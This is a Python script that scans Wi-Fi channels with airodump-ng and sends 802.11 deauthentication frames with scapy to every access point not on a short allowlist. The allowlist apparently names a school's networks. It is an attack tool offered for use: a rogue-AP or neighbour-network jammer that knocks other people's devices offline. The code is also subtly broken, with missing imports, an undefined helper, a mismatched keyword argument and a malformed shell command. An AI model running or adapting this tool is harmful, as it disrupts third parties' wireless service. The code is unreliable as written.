import logging
import csv
import time
import subprocess

from concurrent.futures import ThreadPoolExecutor

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

deauth_counter = 0
csv_lock = threading.Lock()

def deauth(target_mac, bssid, iface, ch, count=1):
    global deauth_counter
    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)])
    
    frame = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=1)
    
    print("\n Sending packet to {}".format(str(frame)))
    
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=True)

    # Increment the deauth counter
    deauth_counter += count

def csv_checker(csv_path, allowed_APs, deauth_counter):
    with csv_lock:
        with open(csv_path, 'r') as csvfile:
            reader = csv.DictReader(csvfile)
            for r in reader:
                if 'BSSID' in r:
                    t_mac = r['BSSID']
                    bssid = r['BSSID']
                    essid = r['ESSID']

                if essid not in allowed_APs:
                    deauth(t_mac=t_mac, bssid=bssid, iface="wlan1", ch=int(r['channel']), count=5)
    return deauth_counter

def run_airodump(channel, allowed_APs, deauth_counter):
    process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "--channel", str(channel), "--write", "output", "--write-interval", "1", "wlan1"])

    time.sleep(t)

    process.terminate()

    fc = count_files()

    for i in range(1, fc + 1):
        subprocess.run(["cat", f"output-{i:02d}.csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    subprocess.run(["cat", "output-*.csv", ">", "merged-scan.csv"], shell=True)

    deauth_counter = csv_checker(csv_path="merged-scan.csv", allowed_APs=allowed_APs, deauth_counter=deauth_counter)
    
    print(f"Total deauth packets sent: {deauth_counter}")

def threading_func(ch_list, allowed_APs, duration):
    global deauth_counter

    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(run_airodump, ch, allowed_APs, deauth_counter) for ch in ch_list]

        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Error: {e}")

t = 10
allowed_APs = ["WapitiWifi", "Wapiti2000", "TheWinchendonSchool", "TheWinchendonSchool2"]
ch_list = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]
threading_func(ch_list=ch_list, allowed_APs=allowed_APs, duration=t)
